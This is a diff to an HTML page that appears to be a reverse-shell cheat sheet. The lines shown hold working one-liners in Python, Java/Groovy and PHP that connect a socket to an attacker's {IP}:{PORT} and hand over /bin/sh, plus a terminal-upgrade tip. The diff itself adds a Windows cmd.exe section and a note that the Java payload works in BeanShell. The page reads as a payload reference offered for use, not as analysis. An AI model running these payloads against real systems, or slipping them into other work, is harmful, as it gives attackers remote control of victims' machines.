@@ -257,6 +257,10 @@ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 <p>The console should be black, next foreground the shell with <code>fg</code> then
 reinitialize the terminal with <code>reset</code>.</p>
 <h2 id="on-the-remote-server">On the remote server</h2>
+<h3 id="windows">Windows</h3>
+<pre><code class="bash">&gt; cmd.exe /C &lt;cmd&gt;
+</code></pre>
+
 <h3 id="python">Python</h3>
 <pre><code class="bash">python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;{IP}\\&quot;,{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);\'
 </code></pre>
@@ -273,6 +277,7 @@ reinitialize the terminal with <code>reset</code>.</p>
 <pre><code class="java">r = Runtime.getRuntime();p = r.exec([&quot;your payload&quot;] as String[]);p.waitFor()
 </code></pre>
 
+<p>This payload can also work with <code>BeanShell</code> scripts.</p>
 <h3 id="php">PHP</h3>
 <pre><code class="bash">php -r '\$sock=fsockopen(\&quot;{IP}\&quot;,{PORT});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'
 </code></pre>
